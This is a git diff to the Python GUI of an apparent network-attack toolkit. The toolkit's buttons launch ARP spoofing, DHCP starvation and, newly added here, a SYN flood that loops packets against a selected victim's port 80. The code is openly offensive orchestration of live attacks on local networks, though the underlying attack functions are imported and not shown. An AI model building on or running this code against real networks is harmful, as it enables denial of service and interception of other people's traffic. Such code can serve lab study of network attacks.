@@ -5,7 +5,7 @@ from PySide6.QtCore import QFile, QObject, Slot, Signal, QRunnable, QThreadPool
 from networkScanner.networkScanner import scanner
 from manInTheMiddle.script import stopSpoof, spoofer
 from DHCP_Starvation.DHCP_Starvation import getInterfaces, DHCPstarving
-
+from SYN_flooding.synFlooding import  SYN_Flood
 
 # Global variables
 targets = []
@@ -52,6 +52,7 @@ class Worker(QRunnable):
 def attacking(name) :
     global attackingStatus
     attackingStatus = True
+
     if (name == "ARP spoofing") :
         victim1IP,victim1Mac = targets[0].split(" : ")
         victim2IP,victim2Mac = targets[1].split(" : ")
@@ -65,18 +66,24 @@ def attacking(name) :
             sys.stdout.flush()
             packets +=2
             time.sleep(2)
-        print("End attacking")
+
     if (name == "DHCP starving"):
         inter = interfaces.currentText()
         print("start attacking DHCP")
         nbPackets = 1
         while (attackingStatus) :
-            print ("sending packet "+str(nbPackets))
+            print ("[+] sending packet "+str(nbPackets))
             DHCPstarving(inter)
             nbPackets+=1
 
-    if (name == "Denial of Service"):
-        print("End attacking")
+    if (name == "SYN flooding"):
+        victim1IP,victim1Mac = targets[0].split(" : ")
+        packets = 0
+        while (attackingStatus) :
+            SYN_Flood(victim1IP,80)
+            printed = "[+] Sent packets "+ str(packets)
+            print(printed)
+            packets +=1    
 
 def stopAttacking(name) :
     if (name == "ARP spoofing") :
@@ -85,7 +92,7 @@ def stopAttacking(name) :
         stopSpoof(victim1IP,victim2IP,victim1Mac, victim2Mac)
     if (name == "DHCP starving") :
         print("")
-    if (name == "Denial of Service"):
+    if (name == "SYN flooding"):
         print("End attacking")
 
 
@@ -182,7 +189,8 @@ if __name__ == "__main__":
         global attackName
         if (attackName == "None") : 
             attackName = window.attacks.currentText()
-            if (len(targets) == 2 or attackName == "DHCP starving") :
+            if (len(targets) == 2 or attackName == "DHCP starving"
+                or (len(targets) == 1 and attackName == "SYN flooding")) :
                 window.console.append(attackName + " attack started")
                 #attacking(attackName)
                 
